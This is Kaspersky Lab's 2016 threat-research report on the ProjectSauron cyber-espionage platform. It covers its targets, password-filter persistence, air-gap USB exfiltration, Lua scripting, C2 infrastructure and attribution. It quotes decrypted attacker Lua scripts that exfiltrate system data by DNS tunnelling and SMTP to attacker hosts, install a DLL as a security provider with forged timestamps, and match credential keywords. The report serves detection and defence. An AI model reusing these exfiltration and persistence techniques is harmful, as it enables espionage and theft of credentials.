{
    "title": "The-ProjectSauron-APT_research_KL",
    "text": "THE PROJECTSAURON APT\nGlobal Research and Analysis Team\nVersion 1.02 (August 9, 2016)The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 2 of 22 \nTable of Contents  \nTable of Contents  ................................ ................................ ................................ ................................ ..............  2 \nExecutive summary ................................ ................................ ................................ ................................ ............  3 \nVictims  ................................ ................................ ................................ ................................ ...............................  5 \nTechnical Summary  ................................ ................................ ................................ ................................ ...........  6 \nMalware Deployment  ................................ ................................ ................................ ................................ ........  7 \nJumping over the Air -Gap ................................ ................................ ................................ ................................ .. 8 \n“VirtualEncryptedNetwork”  ................................ ................................ ................................ ..............................  9 \nNetwork exfiltration  ................................ ................................ ................................ ................................ ........  10 \nLua ................................ ................................ ................................ ................................ ................................ ... 13 \nVFS Structure  ................................ ................................ ................................ ................................ ...................  15 \nC2 Infrastructure  ................................ ................................ ................................ ................................ .............  16 \nAttribution  ................................ ................................ ................................ ................................ .......................  17 \nConclusions  ................................ ................................ ................................ ................................ ......................  21 \n \n \n The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 3 of 22 \nExecutive summary  \nIn September 2015, Kaspersky Lab’s Anti-Targeted Attack Platform  discovered anomalous network t raffic in \na government organization network. Analysis of this incident led to the discovery of a strange executable \nprogram library loaded into the memory of the domain controller server. The library was registered as a \nWindows password filter and had acce ss to sensitive data such as administrative passwords in cleartext. \nAdditional research revealed signs of activity of a previously unknown threat actor, responsible for large -\nscale attacks against key governmental entities.  \n \nThe name, ‘ProjectSauron’ ref lects the fact that the code authors refer to ‘Sauron’ in the configuration files.  \nThe threat actor behind ProjectSauron  commands a top -of-the-top modular cyber -espionage platform in \nterms of technical sophistication, designed to enable long -term campaigns  through stealthy survival \nmechanisms coupled with multiple exfiltration methods. Technical details show how attackers learned from \nother extremely advanced actors in order to avoid repeating their mistakes. As such, all artifacts are \ncustomized per given target, reducing their value as indicators of compromise for any other victim.  \nUsually APT campaigns have a geographical nexus, aimed at extracting information within a specific region \nor from a given industry. That usually results in several infections in countries within that region, or in the \ntargeted industry around the world. In terestingly, ProjectSauron  seems to be dedicated to just a few \ncountries, focused on collecting high value intelligence by compromising almost all key entities it could \npossibly reach within the target area.  \n \n \nThis paper in a nutshell  \n ProjectSauron  is a mo dular platform designed to enable long -term cyber -espionage campaigns.  \n All modules and network protocols use strong encryption algorithms, such as RC6, RC5, RC4, \nAES, Salsa20, etc.  \n ProjectSauron  uses a modified L ua scripting engine to implement the core platform and its \nplugins. There are more than 50 different plugin types.  \nThe ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 4 of 22 \n ProjectSauron  has high interest in communication encryption software widely used by targeted \ngovernmental organisations. It steals encryption k eys, configuration files, and IP addresses of \nthe key infrastructure servers related to the software.  \n ProjectSauron  is able to exfiltrate data from air -gapped networks by using specially -prepared \nUSB storage drives where data is stored in an area invisible  to the operating system.  \n The platform makes extensive use of the DNS protocol for data exfiltration and real -time status \nreporting.  \n The APT has been operational since at least June 2011 and was still active in  2016.  \n The initial infection vector used to pe netrate victim networks remains unknown.  \n The attackers utilize legitimate channels of software distribution for lateral movement within \ninfected networks.  The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 5 of 22 \nVictims  \nUsing our telemetry, we found more than 30 infected organizations in Russia, Iran and Rwanda , and there \nmay be some in Italian -speaking countries.  Many more organizations and geographies are likely to be \naffected.  \nThe organizations attacked are key entities that provide core state functions:  \n Government  \n Scientific research centers  \n Military  \n Telecommunication providers  \n Finance  The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 6 of 22 \nTechnical Summary  \nWhat follows is a summary of the most interesting and unique features of ProjectSauron : \n1. ProjectSauron  usually registers its persistence module on domain controllers as a Windows LSA (Local \nSystem Author ity) password filter. This feature is typically used by system administrators to enforce \npassword policies and validate new passwords to match specific requirements, such as length and \ncomplexity. This way, the ProjectSauron  passive backdoor module starts every time any domain, local \nuser, or administrator logs in or changes a password, and promptly harvests the passwords in plaintext.  \n2. In cases where domain controllers lack direct Internet access, the attackers install additional implants \non other intranet  servers likely to have both Internet access and at the same time generate a lot of \nnetwork traffic, such as proxy­servers, web­servers, or software update servers. After that, these \nintermediary servers are used by ProjectSauron  as internal proxy nodes fo r silent and inconspicuous \ndata exfiltration, blending in with high volumes of other legitimate traffic.  \n3. Once installed, the main ProjectSauron  modules start working as ‘sleeper cells’, displaying no activity of \ntheir own and waiting for ‘wake­up’ commands  in the incoming network traffic. This method of \noperation ensures ProjectSauron ’s extended persistence on the servers of targeted organizations.  \n4. Most of ProjectSauron ’s core implants are designed to work as backdoors, downloading new modules \nor running co mmands from the attacker purely in memory. The only way to capture these modules is \nby making a full memory dump of the infected systems.  \n5. Secondary ProjectSauron  modules are designed to perform specific functions like stealing documents, \nrecording keystrok es, and hijacking encryption keys from both infected computers and attached USB \nsticks.  \n6. Almost all of ProjectSauron ’s core implants are unique, have different file names and sizes, and are \nindividually built for each target. Each module’s timestamp, both i n the file system and in its own \nheaders, is tailored to the environment into which it is installed.  \n7. ProjectSauron  implements a modular architecture using its own virtual file system to store additional \nmodules (plugins) and a modified L ua interpreter to e xecute internal scripts. There are more than 50 \ndifferent plugin types.  \n8. ProjectSauron  works on all modern Microsoft Windows operating systems - both x64 and x86. We have \nwitnessed infections running on Windows XP x86 as well as Windows 2012 R2 Server Editi on x64.  \n9. ProjectSauron  has extensive network communication abilities using full stacks of the most common \nnetwork protocols: ICMP, UDP, TCP , DNS, SMTP, and HTTP.  The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 7 of 22 \nMalware Deployment  \nIn several cases, ProjectSauron  modules were deployed through the modificati on of scripts used by system \nadministrators to centrally deploy legitimate software updates within the network.  \nIn essence, the attackers injected a command to start the malware by modifying existing software \ndeployment scripts. The injected malware is a t iny module (4 -5 Kb) that works as a simple downloader. Once \nstarted on the target computers under a network administrator account, the downloader connects to the \nhard -coded internal or external IP address and downloads the ProjectSauron  payload from there.  \nIn cases where the ProjectSauron  VFS container is stored on disk in EXE file format, it disguises the files with \nlegitimate software file names, for example:  \n \nVendor that uses similar filenames  Disguised malware filename  \nKaspersky Lab  kavupdate.exe, kavupd.exe  \nSymantec  SsaWrapper.exe, symnet32.dll  \nMicrosoft  KB2931368.exe  \nHewlett -Packard  hptcpprnt.dll  \nVmWare  VMwareToolsUpgr32.exe  \n The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 8 of 22 \nJumping over the Air -Gap \nThe ProjectSauron  toolkit contains a special module designed to move data from air­gapped  networks to \nInternet -connected systems. To achieve this, removable USB devices are used. Once networked systems are \ncompromised, the attackers wait for a USB drive to be attached to the infected machine.  \nThese USBs are specially formatted to reduce the s ize of the partition on the USB disk, reserving an amount \nof hidden data (several hundred megabytes) at the end of the disk for malicious purposes. This reserved \nspace is used to create a new custom -encrypted partition that won’t be recognized by a common OS, such \nas Windows. The partition has its own semi -filesystem (or virtual file system, VFS) with two core directories: \n‘In’ and ‘Out’.  \nThis method also bypasses many DLP products, since software that disables the plugging of unknown USB \ndevices based on DeviceID wouldn't prevent an attack or data leakage because a genuine recognized USB \ndrive was used.  \nWhen penetrating isolated systems, the sole creation of the encrypted storage area in the USB does not \nenable attackers to get control of the air -gapped ma chines. There has to be another component such as a \nzero­day exploit placed on the main partition of the USB drive.  Unfortunately we haven’t found any zero -\nday exploit embedded in the body of any of the malware we analyzed, and we believe it was probably \ndeployed in rare, hard -to-catch instances.  \nFor more information, please see the ‘MyTrampoline’ section of ‘ Technical Analysis ’ for technical details.  The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 9 of 22 \n“VirtualEncryptedNetwork”  \nProjectSauron  actively searches for information related to a rather uncommon, custom network encryption \nsoftware. This client -server software is widely adopted by many of the target organizations to secure \ncommunications, voice, email, and document exchange.  To avoid p ossible victim attribution implications \nbased on the real name of the software, we refer to it as “VirtualEncryptedNetwork” (further abbreviated  \nas VEN).  \nIn a number of cases we analyzed, ProjectSauron  deployed malicious modules inside VEN's software \ndirec tory, disguised under similar filenames, accessing the data placed besides its own executable. Decrypted \nLua scripts show that the attackers have a high interest in installed VEN components, encryption keys, virtual \nnetwork configuration files, and the location of servers that relay encrypted messages between the nodes:  \nlocal  t = w.exec2str (\"regedit -a \\\"HKEY_LO CAL_MACHINE \\\\Software \\\\VirtualEncryptedNetwork \\\\Components \\\"  \n |grep -i  [snip]  \") \nlocal  r = w.exec2str (\"cat \\\"\" .. l_3_0 .. \"settings.cfg \" | grep -i \" .. t)  \nw.exec(\" dir /s /b ap *.txt link *.txt node *.tun VirtualEncryptedNetwork .licence VirtualEncryptedNetworkEMail .key  \n VirtualEncryptedNetwork .ini [snip]  | get2 -\") \n \nAlso, one of the embedded ProjectSauron  configurations  contains a special unique identifier for the targeted \nserver (targetid DWORD) within the VEN network.  \nInteresting behavior was found in the component that searched for VEN´s server IP address. After getting the \nIP, the ProjectSauron  component tries  to communicate with the remote server using its own ( ProjectSauron ) \nprotocol as if it was yet another C 2 server. This suggests that some of VEN communication servers could also \nbe infected with ProjectSauron . \n targetId 0D3F0454  \n sourcePort 60439  \n targetPort 5003  \n listenPort 5010  \n \nAfter collecting and exfiltrating  VEN -related data, ProjectSauron  components securely self -remove:  \n e = s.format (\"move -O FakeVirtualEncryptedNetwork.dll FakeVirtualEncryptedNetwork.dl_\" ) \n  w.exec (e) \n  e = s.format (\"wipe FakeVirtualEncryptedNetwork.dl_\" ) \n  w.exec (e) \n  e = s.format (\"rbswap FakeVirtualEncryptedNetwork.dl _\") \n  w.exec (e) The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 10 of 22 \nNetwork exfiltration  \nProjectSauron  uses a number of ways to hide both data exfiltration and the way it receives new commands \nor modules. In addition to common ways to exfiltrate data via direct communication with C2s or its \nintermediate pr oxies using standard protocols (see ‘Technical Analysis ’), ProjectSauron  utilizes a few \nuncommon techniques to exfiltrate data:  \n Tunneling over DNS  \n Email  \nDNS  \nOne of the plugins we analyzed was internally named  ‘DEXT’, which probably stands for DNS exfiltration tool. \nTo avoid generic detection of DNS tunnels at network level, the attackers used it in low -bandwidth mode, \nwhich is why it was used solely to exfiltrate target system metadata : \n domain = \"bikessport[. ]com\"  \n  execStr = string.format (\"sinfo | basex -b 32url | dext -l 30 a.\"  .. domain .. \" | nslu -\") \n  res = w.exec2str (execStr ) \n \nThe example above shows the following ProjectSauron  steps written in a L ua script:   \n1. Collect common system information using a tool called sinfo  \n2. Encode the info into BASE64 -format ( basex ) \n3. Generate a set of DNS packets to a.bikessport[.]com domain with transferred payload chunks of  \n30 bytes per packet ( dext ) \n4. Send generated DNS packets one by one using nslu tool \nThe same approach is used by another script to exfiltrate network configuration information  \n execStr = string.format (\"netnfo -irc | basex -b 32url | dext -l 30 c.\"  .. domain .. \" | nslu -\") \n  res = w.exec2str (execStr ) \n  execStr = string.format (\"regedit -a \\\"\\\\HKCU \\\\Software \\\\Microsoft \\\\Windows \\\\CurrentVersion \\\\Internet Settings \\\" | \nbasex -b 32url | dext -l 30 d.\"  .. domain .. \" | nslu -\") \n  res = w.exec2str (execStr ) \n \nAnother interesting feature in ProjectSauron  that leverages the DNS protocol is the real-time reporting of \nthe operation progress to a remote server . Once an operational milestone is achieved, ProjectSauron  issues \na DNS -request to a special subdomain, which is unique to each target:  \n    domain = \"j.bikessport[.]com\"  \n    execStr = string.format (\"nslu  yhc9421.\"  .. domain ) \n    w.exec2str (execStr ) \n    w.exec (\"sinfo\" ) \n    w.exec (\"wfw status\" ) \n    execStr = string.format (\"nslu yhc9422.\"  .. domain ) The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 11 of 22 \n    w.exec2str (execStr ) \n    w.exec (\"dinst\" ) \n    w.exec (\"pstoredi\" ) \n    execStr = string.format (\"nslu yhc9452.\"  .. domain ) \n    w.exec2str (execStr ) \n    w.exec (\"samdump\" ) \n    w.exec (\"netx -f\") \n    w.exec (\"w3get -s http://ipchicken.com/index.php\" ) \n    execStr = string.format (\"nslu yhc9472.\"  .. domain ) \nEmail  \nWhile we have previously seen malware using email as a data exfiltration method, i.e. Kimsuky   \nor BlueTermite  APT, ProjectSauron  APT uses this channel slightly differently.  \nFirst, ProjectSauron  generates a proper MIME email message that looks identical to an email generated by  \na common email client software. Moreover, it inserts mailer application information, \" Thunderbird 2.0.0.9 \n(Windows/20071031) \" in this case. Email body is a short text message with a unsuspicious subject and  \na ‘data.bin ’ binary attachment encoded with Base64.  The attachment may look like unknown benign data in \nunrecognized format but of course it contains stolen data in encrypted form. The email addresses, message \nsubject and email body are individually selected to each  target and are never reused.  \nNext, ProjectSauron  connects directly to an external SMTP server by using a hard -coded IP (i.e. Google mail \nserver) to send the email. In cases where direct connections to an external mail server are not allowed in the \ntarget network, ProjectSauron  searches for an authorized local email server in the protected virtual network \nby parsing configuration of VEN software and then uses it to send a copy of the email in case of direct \nconnection failure.  \nexternalmail = \"74.125.148.11\"   //Google mail server  \n... \nmailto = \"xxx.xxx.xxx@gmail.com\"  \nmailSubject = \"Regarding your offer\"  \nmailBody = \"This is to inform you that I decline your offer. See attachment. \\n Best Regards xxxxx\"  \nsmtpport = \"\" \nsmtpserver = \"\" \n... \n buffer = string.format (\"%sMessage -ID: <%s.%s@localhost.localdomain>%s\" , buffer , id1, id2, endOfRow ) \n buffer = string.format (\"%sFrom: <%s>%s\" , buffer , l_1_1 , endOfRow ) \n buffer = string.format (\"%sUser -Agent: Thunderbird 2.0.0.9 (Windows/20071031)%s\" , buffer , endOfRow ) \n buffer = string.format (\"%sMIME -Version: 1.0%s\" , buffer , endOfRow ) \n buffer = string.format (\"%sTo: %s%s\" , buffer , l_1_0 , endOfRow ) \n buffer = string.format (\"%sSubject: %s%s\" , buffer , l_1_2 , endOfRow ) \n ... \nregStr = w.exec2str (\"cat VirtualEncryptedNetwork.ini|grep -i \\\"pop|smtp \") \nfor k,v in string .gmatch (regStr , \"(%w+)=([%w,%. ]*)\" ) do \n if string.lower (k) == \"smtpserver\"  then  \n   smtpserver  = v \n end \n if string.lower (k) == \"smtpport\"  then  \n   smtpport = v \n end \nend The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 12 of 22 \n... \nslask = mail (mailto , mailto , mailSubject , mailBody , log) \nslask2 = w.exec2str (\"smtpsend \"  .. externalmail .. \" \" .. mailto .. \" \" .. mailto , slask ) \nw.debugf (slask2 ) \nslask2 = w.exec2str (\"smtpsend \"  .. smtpserver .. \" \" .. mailto .. \" \" .. mailto , slask ) \nw.debugf (slask2 ) \n The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 13 of 22 \nLua \nThe use of a L ua interpreter allowed the attackers to operate with flexibility by writing a simple L ua script for \na target machine. The original Lua interpreter was modified by the attackers  to support Unicode (UTF -16) \nstring encoding.  \nBelow is an example of such a script used to install ProjectSauron  modules onto the system : \ndomain = \"bikessport [.]com\"  \ndllName = \"msprtssp.dll\"  \n  \ninstall_zeta2 = function () \n  \n     windir = os.getenv (\"WINDIR\" ) \n     execStr = string.format (\"put2 zeta2dll \\\"%s\\\\SYSTEM32 \\\\%s\\\"\", windir , dllName ) \n     res = w.exec2str (execStr ) \n     if string.find (res, \"kb/sec\" ) == nil then  \n            w.printf (\"put2 failed \\n%s\\n\", res) \n        return  false  \n    end \n  \n    execStr = string.format (\"nslu gc3220.\"  .. domain ) \n    w.exec2str (execStr ) \n    regwrite = false  \n    regStr = w.exec2str (\"regedit -r \\\"HKLM \\\\System \\\\CurrentControlSet \\\\Control \\\\SecurityProviders \\\"| grep -i \nSecurityProviders\" ) \n    w.printf (\"regStr %s \\n\", regStr ) \n  \n    for k,v in string .gmatch (regStr , \"\\\"(%w+) \\\"=\\\"([%w,%. ]*) \\\"\") do \n        w.printf (\"k=%s, v= %s \\n\", k, v) \n        if string.lower (k) == \"securityproviders\"  then  \n            if string.len (v) > 0 then  \n                value = string.format (\"%s, %s\" , v, dllName ) \n            else \n                value = string.format (\"%s\" , dllName ) \n            end \n            if not string.find (v, dllName , 1, true) then  \n                stdIn = string.format (\"Windows Registry Editor Version \n5.00 \\n\\n[HKEY_LOCAL_MACHINE \\\\SYSTEM \\\\CurrentControlSet \\\\Control \\\\SecurityProviders] \\n\\\"SecurityProviders \\\"=\\\"%s\\\n\"\", value ) \n                w.printf (\"\\n\\nstdIn \\n%s\\n\", stdIn ) \n                out = w.exec2str (\"regedit -i\", stdIn ) \n                w.printf (\"\\n\\nout\\n%s\\n\", out) \n            else \n                w.printf (\"Found dllName \\n\") \n            end \n            regwrite = true  \n        end \n    end \n    if regwrite == true  then  \n        execStr = string.format (\"ftime -c \\\"%s\\\\SYSTEM32 \\\\ntdll.dll \\\" \\\"%s\\\\SYSTEM32 \\\\%s\\\"\", windir , windir , dllName ) \n        res = w.exec2str (execStr ) \n        w.printf (\"%s\\n\", res) \n        execStr = string.format (\"nslu gc3221.\"  .. domain ) \n        w.exec2str (execStr ) The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 14 of 22 \n    end \n    return  regwrite  \nend \n  \nz2res = install_zeta2 () \n  \nif not z2res then  \n    w.printf (\"Installation failed \\n\") \n    execStr = string.format (\"nslu  xxc3222.\"  .. domain ) \n    w.exec2str (execStr ) \nelse \n    str = w.exec2str (\"plist -b | grep netsvcs\" ) \n    pid = string .match (str, \"%w* (%d+) %w*\" ) \n    w.debugf (\"Pid %d \\n\", pid) \n    w.exec2str (string.format (\"pkill %d\" , pid)) \n    w.printf (\"Installation done \\n\") \n    execStr = string.format (\"nslu ooc3222.\"  .. domain ) \n    w.exec2str (execStr ) \nend \nMore L ua examples are shown in ‘Technical Analysis ’. The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 15 of 22 \nVFS Structure  \nThe VFS can have both a linear and a two -level hierarchical view. In the case of a two -level hierarchical view, \none of the levels contains the data responsible for process injection, data stealing and storing it into the local \nProjectSauron  cache, and the second structure contains the data for exfiltration and external network \ncommunications. In the case of a linear view, all types of modules are located on a single level.  \nCuriously, in many cases the same plugins are found in both the VFS upper and lower l evels.  \nTypically, a local cache of stolen files is located within the C:\\System Volume \nInformation \\_restore{ED650925 -A32C -4E9C -8A73 -8E6F0509309A}  folder, and keylogging results are stored \nin %WINDIR% \\Temp \\ folder under the names ‘ bka*.da ’ or ‘ ~*.tmp ’.  \nThe VFS has some pre -defined packages of plugins called ‘blobs’.  \nThe minimal set of plugins for process injection and stored data exfiltration is called kblog.blob and consists \nof the following modules:  \n detach  \n ilpsend  \n dir \n skip  \nIn some cases, there exists an  ‘extended’ package variant used that redirects the exfiltration data stream \nthrough its own local proxy -server and wipes sent documents upon completion. The extended variant \ncontains the following modules:  \n kgate  \n knatt  \n wipe  \nInterestingly, there is no auto matic wiping of the documents sent to the server in the ‘minimal’ package. It’s \nassumed that this task should be carried out by second L ua-script (in the case of a hierarchical VFS – the \nparent or child). However, this assumption is not met in all cases. T his means that in such cases the stolen \ndocuments are not removed and remain stored in the ProjectSauron  cache forever, which suggests a design \nflaw.  The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 16 of 22 \nC2 Infrastructure  \nThe ProjectSauron  actor is extremely well prepared when it comes to operational security . Running an \nexpensive cyberespionage campaign like ProjectSauron  requires vast domain and server infrastructure \nuniquely assigned to each victim organization and never again reused. This makes traditional network -based \nindicators of compromise useless bec ause they are never reused in any other organization.  \nWe collected 28 domains linked to 11 IPs located in the United States and several European countries that \nmight be connected to ProjectSauron  campaigns.  \nIP ISP \n104.131.61.33  Digital Ocean, Inc., US  \n176.9.242.188  Closco Ltd, Germany  \n185.78.64.121  MM ONE Group Srl, Italy  \n192.195.77.59  1&1 Internet Inc., US  \n216.250.114.149  1&1 Internet Inc., US  \n217.160.176.157  1&1 Internet AG, Germany  \n37.252.125.88  Tilaa, The Netherlands  \n54.209.129.218  Amazon AWS,  US \n66.228.52.133  Linode, US  \n81.4.108.168  RamNode, The Netherlands  \n83.125.22.161  AttractSoft GmbH, Germany  \n \nEven the diversity of ISPs selected for ProjectSauron  operations makes it clear that the actor did everything \npossible to avoid creating patterns. Unfortunately, little is known about these servers.  \nThe list of ProjectSauron  domains follows (domains in bold were extracted from malware, the rest were \nfound vi a Passive DNS and are not validated):  \nad-consult.cc  \nart-irisarns.com  \nbikessport.com  \nchirotherapie.at  \ncsrv01.rapidcomments.com  \ndee.hcmut.edu.vn  \nder-wein.at  \ndievinothek.net  \ndisplay24.at  \ndr-rauch.com  easterncredit.net  \nflowershop22.110mb.com  \ngtf.cc  \niut.hcmut.edu.vn  \nliebstoecklco.at  \nlydia -leydolf.at  \nmail.mbit -web.com  \nmbit -web.com  \nmycruiseship.net  \nmyhomemusic.com  ping.sideways.ru  \nrapidcomments.com  \nsba-messebau.at  \nutc-wien.at  \nweingut -haider -malloth.at  \nwildhorses.awardspace.info  \nwindward -trading.biz  \nwinn ie-andersen.com  \n The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 17 of 22 \nAttribution  \nAttribution is hard and reliable attribution is rarely possible in cyberspace. Even with confidence in various \nindicators and apparent attacker mistakes, there is a greater likelihood that these can all be smoke and \nmirrors created by an attacker with a gr eater vantage point and vast resources. When dealing with the most \nadvanced threat actors, as is the case with ProjectSauron , attribution becomes an unsolvable problem.  \nRather than speculate on the perpetrators behind such a sophisticated attack, we instea d highlight a few \nrelevant observations made during analysis.  \nLanguage Use  \nAll human -written text is in English.  \nCore scenarios that orchestrated ProjectSauron  modules were written in L ua, a computer language that \ntraditionally doesn't support the UTF -16 character set for string operations. However, the target systems had \nsome local paths in a non -Latin character set thus creating the requirement to extend L ua to support UTF -\n16, which the developers of ProjectSauron  did. This suggests that originally the ProjectSauron  developers \nworked and tested their code on systems with a Latin character set and only after deploying it in a real -world \nscenario found L ua’s features deficient. Instead of scraping their interpreter of choice, they decided to modify \nit to im plement the missing features.  \nOne of the configuration files we extracted contained a list of file extensions and keywords that contain \nItalian words:  \n.*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*|.*user.*|.*name|.*email|.*_id|id|uid|mn|mailaddress| .*nick.*|alias|\ncodice |uin|sign -in|str CodUtente |.*pass.*|.*pw|pw.*|additional_info|.*secret.*|.* segreto .* \n \nThe italian keywords and filenames targeted by ProjectSauron data theft modules can be translated as \nfollowing:  \nItalian keyword  Translation   \nCodice  code  \nCodUtente  Usercode  \nSegreto  Secret  \n \n  The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 18 of 22 \nMost ProjectSauron  modules contain standard embedded usage output in proficient English, i.e.  \n \narping module  \n -r    Resolve hosts that answer.  \n -l    Print only replying Ips.  \n -m    Do not display MAC addresses.  \n \nThis looks like a very traditional Unix -way of outputting simple command help/usage.  \nHowever, there is no common style of outputting module usage and it varies from module to module. Here \nis an example of a different usage output:  \n \nkblogi module  \nkblogi [options]  \nOptions:  \nkblogi  \n-p proc    Inject using process name or pid. Default \"explorer.exe\".  \n-c file    Convert mode: Read log from file and convert to text.  \n-t sec     Maximum running time in seconds  \n-v         Verbose mode  \n-?         Displays this usage information.  \n \nWhile it may look similar to the previous usage output  an experienced user would recognize the difference: \nit looks more like a usage of command from Windows. The option ‘ -?’ is rarely seen in the Unix world, optional \nparameters are enclosed with ‘[‘ and ‘]’ characters, mandatory parameters are enclosed with ‘<’ and ‘>’, etc.  \nThe following example of usage output is indicative of an experienced Unix user with proper formatting:  \n \nbasex module  \nbasex [ -b <base>] [ -d [-f]] [-h] \nOptions:  \n  -b base  64, 64url, 32, 32url or 16. Default is 64  \n  -d       Decode data. Default is to encode  \n  -f       Force decoding when input is invalid/corrupt  \n  -h       This cruft  \nUses standard in/out. See man page for examples.  \n The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 19 of 22 \nIt seems that the same developer created several tools, as indicated by further identical -style usage \nformatting.  \n \nDNS Exfiltration module (dext)  \ndext [options] suffix  \nOptions:  \n  -a        Assemble rows of DNS names back to a single string of data  \n  -f        Force - removes checks of DNS names and lengths (during split)  \n            and missing/wrapped data (during assembly)  \n  -l length Specify length of data part of suffix (default and max is %d)  \n  -r        Randomize data lengths (length/2 to length)  \n  -h        This cruft  \nSuffix format: domain.com  \nSee man page for examp les. \n \nThere is a noteworthy reference to a ‘man page’, a term for standard Unix manuals. Another unique language \nfeature is usage of \" This cruft \" for the -h option. The term cruft  is rarely used by non -native speakers and \nactually has a Wikipedia  article to explain its use:  \n \n\"Cruft is jargon  for anything that is left over, redundant and getting in the way. It is used particularly for \nsuperseded and unused technical and electronic hardware and useless, superfluous or dysfunctional \nelements in computer software.\"  \n... \n\"Around 1958, the term was used in the sense of \"garbage\" by students frequenting the MIT Tech Model \nRailroad Club.\"  \n... \n\"The FreeBSD handbook uses the term to refer to leftover or superseded object code that accumulates in a \nfolder or directory when software is recompiled and new executables and data files produced. \" \n \nOlder versions of software in the *BSD world, such as cryptcat or netcat (a very common universal network \nclient/server tool for network testing) used identical option descriptions:  \n \nNetcat tool usage, Apple Mac OS, 1999  Cryptcat tool usage, KALI Linux, 2014  \n... \n-g gateway    source -routing hop point[s], up to 8  \n-G num           source -routing pointer: 4, 8, 12, ...  \n-h                      this cruft  \n... … \n    -g gateway      source -routing hop point[s], up to 8  \n    -G num          source -routing pointer: 4, 8, 12, ...  \n    -h          this cruft  \n... \n The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 20 of 22 \nIn fact, this unique way to comment the ‘ -h’ option is mostly found in netcat -derivative projects based on the \noriginal netcat  developed by an old -school hacker known as ‘hobbit’ (hobbit@avian.org)1, who first released \nthe netcat source code back in 1995. Hobbit used the word \"cruft\" four times in the netcat110 source code \nfrom 1996:  \n/* timeout and other signal handling cruft  */ \n    -h      this cruft \\n\\ \n### and have \"xxx.bat\" that types out all the cruft  for %INCLUDE% \\%1. \n# compiler cruft ?? \n \nHowever, we do not believe that hobbit can be in any way related to the development of ProjectSauron  \nmodules. The more likely explanation i s that the developers of the ProjectSauron  modules are also old school \nhackers that develop advanced tools and use \" this cruft \" as a tribute to old and stable tools.  \n \n                                                      \n1 Hobbit's personal page is at http://techno -fandom.org/~hobbit/  The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 21 of 22 \nConclusions  \nEvery APT attack we analyze brings with it some new knowledge about the natur e of cyberespionage. The \nattackers are hackers first and foremost and, as proficient hackers, they invent novel ways to get into  \na network, do lateral movement, leave nearly no traces, all while exfiltrating valuable data.  \nProjectSauron  is a very advanced actor, comparable only to the top -of-the-top in terms of sophistication: \nalongside Duqu, Flame, Equation, and Regin. Whether related or unrelated to these advanced actors, the \nProjectSauron  attackers have definitely learned from these o thers.  \nAs a reminder, here are some features of other APT attackers that ProjectSauron  attackers had carefully \nlearned from or emulated:  \nDuqu:  \n Use of intranet C2s (that compromised target servers may act as independent C2s)  \n Running only in memory (persistence on a few gateway hosts only)  \n Use of different encryption methods per victim  \n Use of named pipes for LAN communication  \n Malware distribution through legitimate software deployment channels  \nFlame:  \n Lua-embedded code  \n Secure file deletion (through da ta wiping)  \n Attacking air -gapped systems via removable devices  \nEquation and Regin:  \n Usage of RC5/RC6 encryption  \n Virtual Filesystems (VFS)  \n Attacking air -gapped systems via removable devices  \n Hidden data storage on removable devices  \nThese other actors also sho wed what makes them vulnerable to potential exposure and ProjectSauron  did \nits best to address these issues:  \n Vulnerable or persistent C2 locations  \n ISP, IP, domains, and tool reuse across different campaigns  \n Crypto -algorithms reuse (as well as encryption ke ys) \n Forensic evidence on disk  \n Timestamps in various components  \n Large volumes of network data or unusual protocols or message formats  \nIn addition, it appears that the attackers took special care with what we consider as indicators of compromise \nand implemen ted a unique pattern for each and every target they attacked, so that the same indicators The ProjectSauron  APT  \n \nFor any inquiries, contact intelreports@kaspersky.com                 Page 22 of 22 \nwould have little value for anyone else. This is a summary of the ProjectSauron  strategy as we see it. The \nattackers clearly understand that we as researchers are alw ays looking for patterns. Remove the patterns \nand the operation will be harder to discover. We are aware of more than 30 organisations attacked but we \nare sure that this is just a tiny tip of the iceberg.  \nA common organisation hit by a serious actor such a s ProjectSauron  can hardly cope with proper detection \nand mitigation of such a threat on its own. As attackers become seasoned and more mature, the defending \nside will have to build an identical mindset: developing the highest technical skills comparable t o those of the \nattackers in order to resist their onslaught.  \n Securelist , the resource for \nKaspersky Lab experts’ \ntechnical research,  \nanalysis, and thoughts.Follow us\n \n Kaspersky Lab global Website  Eugene Kaspersky Blog\n Kaspersky Lab B2C Blog  Kaspersky Lab B2B Blog\n Kaspersky Lab security news service  Kaspersky Lab AcademyContact us at: intelligence@kaspersky.com"
}